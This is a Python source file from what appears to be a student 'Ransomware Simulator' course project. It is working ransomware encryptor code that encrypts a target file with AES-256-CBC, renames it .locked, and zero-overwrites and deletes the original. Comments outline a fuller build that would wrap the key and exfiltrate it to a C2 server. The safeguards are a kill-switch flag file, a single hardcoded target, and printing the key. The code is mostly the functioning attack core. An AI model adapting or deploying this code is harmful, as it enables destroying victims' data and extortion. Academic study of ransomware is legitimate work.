"""
encryptor_poc.py — AES-256-CBC Single-File Encryption Proof of Concept
IT360 Project 14: Ransomware Simulator (Academic Use Only)

SAFETY NOTICE:
    This script will not execute if a file named 'DO_NOT_RUN.flag'
    exists in the current directory. Always run inside an air-gapped VM.
    Never execute on a host machine or any system with real data.

Author : P1 — Malware Developer
Course : IT360
Purpose: Phase 1 PoC — demonstrate AES-256-CBC file encryption using
         the `cryptography` library. No networking. No recursion.
         Single target file only.
"""
 
import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding


# ---------------------------------------------------------------------------
# CONSTANTS
# ---------------------------------------------------------------------------

KILL_SWITCH_FILENAME = "DO_NOT_RUN.flag"
LOCKED_EXTENSION = ".locked"
TARGET_FILE = "test_files/sample.txt"   # Hardcoded for PoC — single file only


# ---------------------------------------------------------------------------
# FUNCTIONS
# ---------------------------------------------------------------------------

def check_kill_switch() -> None:
    """
    Check for the presence of the kill-switch flag file.

    If 'DO_NOT_RUN.flag' exists in the current working directory,
    the script exits immediately without performing any action.

    This mirrors the concept behind the WannaCry (2017) kill-switch:
    the malware queried a hardcoded domain; if it resolved, execution
    halted. Here we use a local flag file as a safe academic equivalent.
    """
    if os.path.exists(KILL_SWITCH_FILENAME):
        print(f"[KILL SWITCH] '{KILL_SWITCH_FILENAME}' detected. Halting.")
        print("[KILL SWITCH] No files were modified.")
        sys.exit(0)


def generate_key_iv() -> tuple[bytes, bytes]:
    """
    Generate a cryptographically random AES-256 key and 128-bit IV.

    Uses os.urandom() which pulls from the OS CSPRNG (/dev/urandom on
    Linux, CryptGenRandom on Windows). Never use random.randbytes() or
    random.random() for cryptographic material.

    Returns:
        tuple[bytes, bytes]: A (key, iv) pair.
            key: 32 bytes (256 bits) — AES-256 key.
            iv : 16 bytes (128 bits) — AES block size IV for CBC mode.
    """
    key: bytes = os.urandom(32)   # 256-bit AES key
    iv: bytes = os.urandom(16)    # 128-bit IV (AES block size)
    return key, iv


def encrypt_file(filepath: str, key: bytes, iv: bytes) -> str:
    """
    Encrypt a single file using AES-256-CBC and rename it with .locked.

    Reads the target file, applies PKCS7 padding to align plaintext to
    the AES 128-bit block boundary, encrypts with AES-CBC, and writes
    the IV prepended to the ciphertext into a new file. The original
    file is then securely deleted via secure_delete().

    The IV is stored as the first 16 bytes of the output file so the
    decryptor can recover it without any additional metadata file.
    This is a common pattern in real ransomware implementations.

    Args:
        filepath: Path to the plaintext file to encrypt.
        key     : 32-byte AES-256 key.
        iv      : 16-byte initialization vector for CBC mode.

    Returns:
        str: Path to the newly created .locked file.

    Raises:
        FileNotFoundError: If the target file does not exist.
        PermissionError  : If the file cannot be read or written.
    """
    locked_path: str = filepath + LOCKED_EXTENSION

    try:
        # --- Read plaintext ---
        with open(filepath, "rb") as f:
            plaintext: bytes = f.read()

        # --- Apply PKCS7 padding ---
        # AES-CBC requires plaintext length to be a multiple of 16 bytes.
        # PKCS7 pads with N bytes each of value N (e.g., 3 missing bytes → \x03\x03\x03).
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_plaintext: bytes = padder.update(plaintext) + padder.finalize()

        # --- Build AES-CBC cipher and encrypt ---
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
        encryptor = cipher.encryptor()
        ciphertext: bytes = encryptor.update(padded_plaintext) + encryptor.finalize()

        # --- Write IV + ciphertext to .locked file ---
        # Prepending the IV (non-secret) allows the decryptor to function
        # with just the AES key — no separate metadata file needed.
        with open(locked_path, "wb") as f:
            f.write(iv + ciphertext)

        print(f"[+] Encrypted : {filepath}")
        print(f"[+] Output    : {locked_path}")

    except FileNotFoundError:
        print(f"[ERROR] File not found: {filepath}")
        sys.exit(1)
    except PermissionError:
        print(f"[ERROR] Permission denied: {filepath}")
        sys.exit(1)

    # --- Securely delete the original plaintext file ---
    secure_delete(filepath)

    return locked_path


def secure_delete(filepath: str) -> None:
    """
    Overwrite a file with zeros before deletion.

    A simple os.remove() marks the file's directory entry as free but
    leaves the data blocks on disk — recoverable with tools like
    Autopsy or PhotoRec. Overwriting with zeros first destroys the
    on-disk plaintext before the filesystem entry is released.

    Note: This is a basic single-pass zero-overwrite. Forensic-grade
    secure deletion (e.g., DoD 5220.22-M) uses multiple passes with
    random patterns, but is overkill for this academic PoC.

    Args:
        filepath: Path to the file to securely delete.
    """
    try:
        file_size: int = os.path.getsize(filepath)

        with open(filepath, "r+b") as f:
            f.write(b"\x00" * file_size)   # Overwrite every byte with 0x00
            f.flush()
            os.fsync(f.fileno())            # Force OS to commit write to disk

        os.remove(filepath)
        print(f"[+] Securely deleted original: {filepath}")

    except (FileNotFoundError, PermissionError) as e:
        print(f"[ERROR] Could not securely delete {filepath}: {e}")


# ---------------------------------------------------------------------------
# ENTRY POINT
# ---------------------------------------------------------------------------

if __name__ == "__main__":

    print("=" * 60)
    print("  IT360 — Ransomware Simulator | Encryptor PoC (P1)")
    print("  FOR ACADEMIC USE IN AIR-GAPPED VM ONLY")
    print("=" * 60)

    # Step 1: Kill-switch check — must be first action
    check_kill_switch()

    # Step 2: Generate fresh AES-256 key and IV from CSPRNG
    aes_key, aes_iv = generate_key_iv()

    # Step 3: Display key material — in the full implementation this
    #         would be RSA-wrapped and POSTed to the C2 server (P2's domain).
    #         Here we print to stdout for PoC demonstration only.
    print(f"\n[*] AES-256 Key (hex) : {aes_key.hex()}")
    print(f"[*] AES IV      (hex) : {aes_iv.hex()}")
    print("[!] In full build: key is RSA-wrapped and exfiltrated to C2.")
    print()

    # Step 4: Encrypt the single target file
    output_path = encrypt_file(TARGET_FILE, aes_key, aes_iv)

    print()
    print(f"[✓] Done. Locked file written to: {output_path}")
    print("[✓] Original file securely deleted.")
    print("\n[i] To decrypt: run decryptor.py with the AES key printed above.")
    print("=" * 60)